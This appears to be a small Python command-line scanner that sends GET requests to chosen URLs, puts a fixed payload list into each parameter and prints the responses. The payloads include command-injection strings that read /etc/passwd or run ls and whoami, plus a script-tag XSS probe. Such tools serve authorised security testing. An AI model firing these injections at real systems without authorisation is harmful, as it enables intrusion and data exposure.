import click
import requests

PAYLOADS=[
    'pippo',
    '; cat /etc/passwd',
    'randomfile.txt; ls',
    'a || whoami',
    '<script>alert(\'pippo\')</script>'
]

URLS=[]

@click.command()
@click.option('--target', '--t', required=True, help='A target host (e.g., http://localhost)')
@click.option('--urls', '--u', required=True, multiple=True, help='A list of URLs to scan')
@click.option('--methods', '--m', required=True, 
    type=click.Choice(['GET'], case_sensitive=True), multiple=True, help='A list of methods for each URL')
@click.option('--params', '--p', required=True, multiple=True, help='A list of parameters for each URL You can use any input format you want')
def main(target, urls, methods, params):
    
    format_requests(target, urls)

    for idx, method in enumerate(methods):
        if method == 'GET':
            payloads = prepare_payload(params, idx)
            for payload in payloads:
                req = requests.get(URLS[idx], params=payload)
                print(req.url)
                print(req.content)

def prepare_payload(parameters, idx):
    payloads = []
    params = parameters[idx].split(':')
    for payload in PAYLOADS:
        payload_dict = {}
        for param in params:
            payload_dict[param]=payload
        payloads.append(payload_dict)
    return payloads

def format_requests(target, urls):
    for url in urls:
        URLS.append(f"{target}/{url}")

if __name__ == '__main__':
    main()
